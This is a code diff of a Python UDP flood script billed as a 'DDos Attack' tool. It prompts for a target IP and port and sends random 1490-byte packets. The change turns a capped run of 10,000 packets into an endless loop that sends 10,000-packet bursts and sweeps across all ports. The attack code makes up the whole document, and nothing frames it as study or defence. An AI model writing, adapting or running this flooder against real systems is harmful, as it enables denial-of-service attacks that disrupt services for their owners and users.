@@ -5,57 +5,60 @@ import socket
 import random
 from datetime import datetime
 
-# Get current time
+# Code Time
 now = datetime.now()
-
-# Extract hour, minute, day, month, year
 hour = now.hour
 minute = now.minute
 day = now.day
 month = now.month
 year = now.year
 
-# Create a UDP socket
+# Set up socket
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-
-# Generate random bytes for packet payload
 bytes = random._urandom(1490)
 
-# Clear the screen and display information
+# Clear console and print header
 os.system("clear")
-print("UDP Flood Attack Script")
-print("Author   : Saphal Lamsal")
+os.system("figlet DDos Attack")
+print()
+print("Author   : Tech Tushar")
+print("You Tube : https://www.youtube.com/c/TechTushar")
+print("github   : https://github.com/Techtushar07")
+print("Facebook : https://www.facebook.com/daveratushar/")
 print()
 
-# Input target IP address and port number
+# Get target IP and port
 ip = input("IP Target : ")
 port = int(input("Port       : "))
 
-# Clear the screen and display attack starting message
+# Clear console and print attack starting message
 os.system("clear")
-print("UDP Flood Attack Starting")
+os.system("figlet Attack Starting")
 print("[                    ] 0% ")
+time.sleep(1)
+print("[=====               ] 25%")
+time.sleep(1)
+print("[==========          ] 50%")
+time.sleep(1)
+print("[===============     ] 75%")
+time.sleep(1)
+print("[====================] 100%")
+time.sleep(1)
 
-# Calculate packets per second and total packet count
-packets_per_second = 10000 / 10  # 10,000 packets in 10 seconds
-total_packets = 10000
+# Start sending packets
+sent = 0
+packets_per_interval = 10000
+interval = 10  # seconds
 
-# Calculate the time interval between packets
-interval = 1.0 / packets_per_second
-
-# Start sending UDP packets
-start_time = time.time()
-sent_packets = 0
-try:
-    while sent_packets < total_packets:
+while True:
+    start_time = time.time()
+    for _ in range(packets_per_interval):
         sock.sendto(bytes, (ip, port))
-        sent_packets += 1
-        print(f"Sent packet {sent_packets}/{total_packets} to {ip} through port: {port}")
-        time.sleep(interval)
-except KeyboardInterrupt:
-    print("\nAttack stopped.")
-
-# Calculate and print the actual time taken
-end_time = time.time()
-elapsed_time = end_time - start_time
-print("Actual time taken: %.2f seconds" % elapsed_time)
+        sent += 1
+        port += 1
+        if port == 65534:
+            port = 1
+    elapsed_time = time.time() - start_time
+    if elapsed_time < interval:
+        time.sleep(interval - elapsed_time)
+    print(f"Sent {sent} packets so far")
